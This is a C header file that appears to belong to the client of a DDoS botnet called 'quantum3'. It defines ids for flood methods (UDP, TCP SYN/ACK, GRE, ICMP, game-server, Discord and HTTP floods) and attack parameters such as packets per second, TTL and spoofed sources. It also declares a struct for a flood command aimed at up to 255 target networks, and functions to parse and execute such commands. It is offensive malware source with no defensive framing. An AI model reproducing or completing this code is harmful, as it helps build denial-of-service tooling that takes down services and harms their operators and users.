#ifndef QV3_FLOOD_H
#define QV3_FLOOD_H

#include <stdint.h>
#include <stddef.h>

/* quantum3 method ids (server consts.go) */
enum {
    ATK_UDP_PLAIN = 0,
    ATK_UDP_RAW   = 1,
    ATK_TCP_SYN   = 2,
    ATK_TCP_ACK   = 3,
    ATK_TCP_TFO   = 4,
    ATK_TCP_LEGIT = 5,
    ATK_IPIP_UDP  = 6,
    ATK_GRE_IP    = 7,
    ATK_ICMP      = 8,
    ATK_APP_SOCKET= 9,
    ATK_MC_STATUS = 10,
    ATK_MC_JOIN  = 11,
    ATK_RAKNET   = 12,
    ATK_VSE      = 13,
    ATK_TS3      = 14,
    ATK_DISCORD  = 15,
    ATK_HTTP     = 16,
    ATK_HTTPS    = 17,
};

/* quantum3 property ids (properties.go) */
enum {
    PROP_DPORT=0, PROP_SPORT=1, PROP_LENGTH=2, PROP_MINLEN=3, PROP_MAXLEN=4,
    PROP_RANDOMIZE=5, PROP_PAYLOAD=6, PROP_MINPPS=7, PROP_MAXPPS=8, PROP_SLEEP=9,
    PROP_CONNS=10, PROP_REPEAT=11, PROP_COPYWINDOW=12, PROP_TTL=13, PROP_SOURCES=14,
};

typedef struct {
    uint32_t atk_id;
    uint8_t  method;
    uint32_t duration;
    uint8_t  target_count;
    struct { uint32_t addr; uint8_t netmask; } targets[255];
    uint8_t  prop_count;
    struct { uint8_t id; uint8_t data[512]; uint32_t len; } props[32];
} qv3_flood;

int qv3_flood_parse(const uint8_t *buf, size_t len, qv3_flood *f);
int qv3_attack_exec(const qv3_flood *f);

#endif
